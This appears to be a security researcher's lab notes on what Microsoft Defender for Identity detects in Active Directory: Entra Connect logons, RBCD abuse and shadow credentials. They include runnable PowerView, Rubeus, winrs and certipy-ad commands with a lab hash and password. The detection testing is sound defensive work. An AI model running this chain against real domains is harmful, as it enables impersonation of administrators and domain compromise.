
# MDI detects interactive logon to Entra Connect server

![](img/Pasted%20image%2020260424143259.png)

![](img/Pasted%20image%2020260424143306.png)

![](img/Pasted%20image%2020260423182017.png)

# MDI detects RBCD
- MDI detects making an account vulnerable to RBCD
- MDI detects any modification of the msds-allowedtoactonbehalfofotheridentity attribute

```bash
# RBCD (GenericWrite over an account)
Import-Module .\PowerView.ps1
# SID of svc_mhd
$ObjectSid = "S-1-5-21-2498267786-1201464700-2190978386-2104"
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ObjectSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# Making SRV01 vulnerable to RBCD ==> detected
Get-DomainComputer SRV01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# exploit RBCD
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe s4u /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:svc_mhd /rc4:F894F8DBE06D430421B73202F4A5160D /impersonateuser:Administrator /msdsspn:wsman/srv01.yhp0w.lan /enctype:aes256 /opsec /nowrap /ptt

# winrm
winrs -r:srv01.yhp0w.lan cmd

# Clean up
Get-DomainComputer SRV01 | Set-DomainObject -Clear msds-allowedtoactonbehalfofotheridentity -Verbose
```

![](img/Pasted%20image%2020260422124018.png)

![](img/Pasted%20image%2020260422123955.png)

# MDI detects Shadow credentials
- MDI detects making an account vulnerable to Shadow credentials
- MDI detects any modification of the msds-KeyCrentialLink attribute

```bash
# Shadow credentials (GenericWrite over an account)
certipy-ad shadow auto -u 'svc_mhd@yhp0w.lan' -p 'Open@llP@55' -dc-ip '172.23.126.134' -account 'srv01$'
```

![](img/Pasted%20image%2020260422131408.png)

![](img/Pasted%20image%2020260422131425.png)

![](img/Pasted%20image%2020260422134017.png)

![456](img/Pasted%20image%2020260422134112.png)

